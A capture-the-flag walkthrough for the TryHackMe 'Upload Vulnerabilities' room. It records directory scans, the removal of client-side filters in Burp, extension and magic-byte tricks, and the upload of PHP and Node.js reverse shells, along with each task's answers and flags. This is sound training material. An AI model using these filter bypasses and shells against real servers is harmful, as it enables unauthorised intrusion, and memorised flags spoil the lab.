# Notes for the room Upload Vulnerabilities (https://tryhackme.com/room/uploadvulns). Part of the "Complete Beginner Path"

If you're using Linux or MacOS, open up a terminal and type in the following command, then hit enter:
```
echo "10.10.72.201    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm" | sudo tee -a /etc/hosts
```
When you finish the room, run this command to revert the hosts file back to normal:
```
sudo sed -i '$d' /etc/hosts
```

### Task 4

What is the name of the image file which can be overwritten?

```
mountains.jpg
```

Overwrite the image. What is the flag you receive?

```
THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5} 
```

### Task 5

Navigate to `shell.uploadvulns.thm` and complete the questions for this task.

Run a Gobuster scan on the website using the syntax from the screenshot above. What directory looks like it might be used for uploads?

(N.B. This is a good habit to get into, and will serve you well in the upcoming tasks...)

Command:

```
gobuster dir -u http://shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Answer:

```
/resources
```

Get either a web shell or a reverse shell on the machine.
What's the flag in the /var/www/ directory of the server?

Getting the reverse shell from here: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php and changing the ip to the tun0 ip.

Remember to start a netcat listner `nc -lvnp 1234` in this case.

```
THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}
```

### Task 6

What is the traditional server-side scripting language?

```
PHP
```

When validating by file extension, what would you call a list of accepted extensions (whereby the server rejects any extension not in the list)?

```
whitelist
```

[Research] What MIME type would you expect to see when uploading a CSV file?

```
text/csv
```

### Task 7

We've covered in detail two ways to bypass a Client-Side file upload filter. Now it's time for you to give it a shot for yourself! Navigate to `java.uploadvulns.thm` and bypass the filter to get a reverse shell. Remember that not all client-side scripts are inline! As mentioned previously, Gobuster would be a very good place to start here -- the upload directory name will be changing with every new challenge.


Will try to describe the steps here:

1. Do a gobuster scan: `gobuster dir -u http://java.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` 

Output from gobuster:

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://java.uploadvulns.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/16 04:31:55 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 329] [--> http://java.uploadvulns.thm/images/]
/assets               (Status: 301) [Size: 329] [--> http://java.uploadvulns.thm/assets/]
Progress: 1975 / 220561 (0.90%)                                                         ^C
[!] Keyboard interrupt detected, terminating.
                                                                                         
===============================================================
2021/04/16 04:32:09 Finished
===============================================================

```

2. Go to here http://java.uploadvulns.thm/assets/js/client-side-filter.js and see that it's filtering for png:

```
window.onload = function(){
	var upload = document.getElementById("fileSelect");
	var responseMsg = document.getElementsByClassName("responseMsg")[0];
	var errorMsg = document.getElementById("errorMsg");
	var uploadMsg = document.getElementById("uploadtext");
	upload.value="";
	upload.addEventListener("change",function(event){
		var file = this.files[0];
		responseMsg.style = "display:none;";
		if (file.type != "image/png"){
			upload.value = "";
			uploadMsg.style = "display:none;";
			error();
		} else{
			uploadMsg.innerHTML = "Chosen File: " + upload.value.split(/(\\|\/)/g).pop();
			responseMsg.style="display:none;";
			errorMsg.style="display:none;";
			success();
		}
	});
};

```

3. Open Burp Suite and intercept the message by enabling the proxy. Right click on the message select 'Do Intercept' --> 'Response to this Request'
4. 'Forward' the message and you will get this:

```
HTTP/1.1 200 OK
Server: nginx/1.17.6
Date: Fri, 16 Apr 2021 08:54:35 GMT
Content-Type: text/html; cherset=utf-8;charset=UTF-8
Content-Length: 1221
Connection: close
Vary: Accept-Encoding


<!DOCTYPE html>
<html>
	<head>
		<title>Java!</title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
		<link rel="stylesheet" type="text/css" href="assets/css/style.css">
		<link rel="stylesheet" type="text/css" href="assets/css/icons.css">
		<link rel="stylesheet" type="text/css" href="assets/css/indieflower.css">
		<script src="assets/js/jquery-3.5.1.min.js"></script>
		<script src="assets/js/script.js"></script>
		<script src="assets/js/firstload.js"></script>
	
		<script src="assets/js/client-side-filter.js"></script>
		
	</head>
	<body>
		<main>
			<div id="maintext">
				<h1>Café<span id=mug> S </span>Java!</h1>
				<button class="Btn" id="uploadBtn">Select File</button>
				<form method="post" enctype="multipart/form-data">
					<input type="file" name="fileToUpload" id="fileSelect" style="display:none">
					<input class="Btn" type="submit" value="Upload" name="submit" id="submitBtn">
				</form>
				<p style="display:none;" id="errorMsg">Invalid File Type</p>
				<p style="display:none;" id="uploadtext"></p>
				<p class="responseMsg" style="display:none;" ></p>
			</div>
		</main>
	</body>
</html>
```

5. Delete `<script src="assets/js/client-side-filter.js"></script>` and 'Forward'

6. Upload the `php-reverse-shell.php` and go to `http://java.uploadvulns.thm/assets`. Then click on the reverse-shell and have a netcat listner `nc -lvnp 1234`

7. Voila! You are in, then find the flag.

What is the flag in /var/www/?

```
THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}
```

### Task 8

Now your turn. You know the drill by now -- figure out and bypass the filter to upload and activate a shell. Your flag is in /var/www/. The site you're accessing is `annex.uploadvulns.thm`.

Be aware that this task has also implemented a randomised naming scheme for the first time. For now you shouldn't have any trouble finding your shell, but be aware that directories will not always be indexable...

First do a gobuster scan: `gobuster dir -u http://annex.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

Output:

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://annex.uploadvulns.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/16 05:06:36 Starting gobuster in directory enumeration mode
===============================================================
/privacy              (Status: 301) [Size: 332] [--> http://annex.uploadvulns.thm/privacy/]
/assets               (Status: 301) [Size: 331] [--> http://annex.uploadvulns.thm/assets/] 
Progress: 3161 / 220561 (1.43%)                                                           ^C
[!] Keyboard interrupt detected, terminating.
                                                                                           
===============================================================
2021/04/16 05:06:59 Finished
===============================================================

```

Change the reverse shell php script to the extension php5. Then go to /privacy and launch.

What is the flag in /var/www/?

```
THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}
```

### Task 9

This will be the final example website you have to hack before the challenge in task eleven; as such, we are once again stepping up the level of basic security. The website in the last task implemented an altered naming scheme, prepending the date and time of upload to the file name. This task will not do so to keep it relatively easy; however, directory indexing has been turned off, so you will not be able to navigate to the directory containing the uploads. Instead you will need to access the shell directly using its URI.

Bypass the magic number filter to upload a shell. Find the location of the uploaded shell and activate it. Your flag is in /var/www/.

When uploading a file it says 'GIFs only please!', so we know that it only takes gifs.

Gobuster scan:

```
└─$ gobuster dir -u http://magic.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                               1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://magic.uploadvulns.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/16 05:26:18 Starting gobuster in directory enumeration mode
===============================================================
/graphics             (Status: 301) [Size: 333] [--> http://magic.uploadvulns.thm/graphics/]
/assets               (Status: 301) [Size: 331] [--> http://magic.uploadvulns.thm/assets/]  
Progress: 2357 / 220561 (1.07%)                                                            ^C
[!] Keyboard interrupt detected, terminating.
                                                                                            
===============================================================
2021/04/16 05:26:35 Finished
===============================================================

```

Go to here to find the HEX for gif: https://en.wikipedia.org/wiki/List_of_file_signatures 

HEX for gif: `47 49 46 38 37 61`. Open php script and put in 6 A's because GIF has 6 HEX bytes.

Open hexeditor and change the `41`s

Before change:

```
─$ file php-reverse-shell.php
php-reverse-shell.php: PHP script, ASCII text
```

After change:

```
─$ file php-reverse-shell.php
php-reverse-shell.php: GIF image data, version 87a, 15370 x 28735
```

Upload and go to http://magic.uploadvulns.thm/graphics/php-reverse-shell.php. Remember your netcat listner

Grab the flag from /var/www/
```
THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}
```

### Task 11


Take what you've learned in this room and use it to get a shell on this machine. As per usual, your flag is in /var/www/. Bear in mind that this challenge will be an accumulation of everything you've learnt so far, so there may be multiple filters to bypass. The attached wordlist might help. Also remember that not all webservers have a PHP backend...


Starting with a gobuster scan:

```
└─$ gobuster dir -u http://jewel.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                            130 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jewel.uploadvulns.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/16 05:47:02 Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 181] [--> /content/]
/modules              (Status: 301) [Size: 181] [--> /modules/]
/admin                (Status: 200) [Size: 1238]               
/assets               (Status: 301) [Size: 179] [--> /assets/] 
/Content              (Status: 301) [Size: 181] [--> /Content/]
/Assets               (Status: 301) [Size: 179] [--> /Assets/] 
/Modules              (Status: 301) [Size: 181] [--> /Modules/]
/Admin                (Status: 200) [Size: 1238]               
Progress: 18988 / 220561 (8.61%)                              ^C
[!] Keyboard interrupt detected, terminating.
                                                               
===============================================================
2021/04/16 05:49:18 Finished
===============================================================

```

From here http://jewel.uploadvulns.thm/assets/js/upload.js we can see:

```
			//Check File Size
			if (event.target.result.length > 50 * 8 * 1024){
				setResponseMsg("File too big", "red");			
				return;
			}
			//Check Magic Number
			if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
				setResponseMsg("Invalid file format", "red");
				return;	
			}
			//Check File Extension
			const extension = fileBox.name.split(".")[1].toLowerCase();
			if (extension != "jpg" && extension != "jpeg"){
				setResponseMsg("Invalid file format", "red");
				return;
			}
```

This means that it's checking if the file is too large, the macgic number and the file extension. So my idea is to change the magic number to jpg + the extension.

jpg HEX is `FF D8 FF DB` 

File was succesfully uploaded! Now it's time to find it! 

ABORT MISSION. Installed the Wappalyzer and saw that the website runs Node.js and then the php reverse-shell will not work.

Followed along with this video: https://www.youtube.com/watch?v=8UPXibv_s1A

Doing a gobuster search with the provided wordlist and in the directory `/content`

```
└─$ gobuster dir -u http://jewel.uploadvulns.thm/content -w UploadVulnsWordlist.txt -x jpg
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jewel.uploadvulns.thm/content
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                UploadVulnsWordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              jpg
[+] Timeout:                 10s
===============================================================
2021/04/16 07:52:10 Starting gobuster in directory enumeration mode
===============================================================
/ABH.jpg              (Status: 200) [Size: 705442]
/LKQ.jpg              (Status: 200) [Size: 444808]
/SAD.jpg              (Status: 200) [Size: 247159]
/UAD.jpg              (Status: 200) [Size: 342033]
                                                  
===============================================================
2021/04/16 07:55:56 Finished
===============================================================
                                                                  
```

Then go to here and get a reverse shell for node.js: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs

Make a `shell.js` and change the port and IP. Try and upload and see if it works.

Open Burp Suite with intercept on. Remember when refresh site do with crtl+f5. Forward until you get upload and respond to that. Forward again until you get the response. Delete the filtering and upload the `shell.js`. It will not work due to server-filter. Therefor change the `shell.js` to `shell.jpg` and upload again. Sucess!

Run a gobuster scan and check response:

```
└─$ gobuster dir -u http://jewel.uploadvulns.thm/content -w UploadVulnsWordlist.txt -x jpg
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jewel.uploadvulns.thm/content
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                UploadVulnsWordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              jpg
[+] Timeout:                 10s
===============================================================
2021/04/16 08:06:44 Starting gobuster in directory enumeration mode
===============================================================
/AAQ.jpg              (Status: 200) [Size: 380]
/ABH.jpg              (Status: 200) [Size: 705442]
/LKQ.jpg              (Status: 200) [Size: 444808]
/SAD.jpg              (Status: 200) [Size: 247159]
/UAD.jpg              (Status: 200) [Size: 342033]
                                                  
===============================================================
2021/04/16 08:10:29 Finished
===============================================================

```

New file is `AAQ.jpg`. Go to admin page and run `../content/AAQ.jpg` because you are in modules so you need to go one folder up.

Remember to setup netcat with the port you specified in the revershell and BOOM! You are in!

Hack the machine and grab the flag from /var/www/

```
THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}
```

